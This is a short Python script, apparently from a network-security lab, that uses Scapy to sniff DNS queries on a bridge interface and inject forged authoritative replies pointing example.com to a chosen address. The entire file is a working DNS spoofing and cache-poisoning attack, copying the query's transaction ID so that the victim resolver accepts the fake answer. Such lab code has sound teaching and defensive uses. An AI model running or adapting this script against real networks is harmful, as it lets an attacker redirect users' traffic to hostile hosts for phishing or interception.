#!/usr/bin/env python3
from scapy.all import *
import sys

"""
Flush the DNS cache on local DNS server before with
rndc flush 
"""

NS_NAME = "example.com"


def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Create an IP object
        udp = UDP(dport=pkt[UDP].sport, sport=53) # Create a UPD object

        anssec = DNSRR(rrname=NS_NAME, rdata="1.2.3.4")

        # Construct the DNS packet
        dns = DNS(id=pkt[DNS].id, qr=1, opcode="QUERY", aa=1, qdcount=1, ancount=1, qd=pkt[DNS].qd, an=anssec)
        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
        send(spoofpkt)


myFilter = "udp and port 53" # Set the filter
pkt=sniff(iface='br-1d24810f49e2', filter=myFilter, prn=spoof_dns)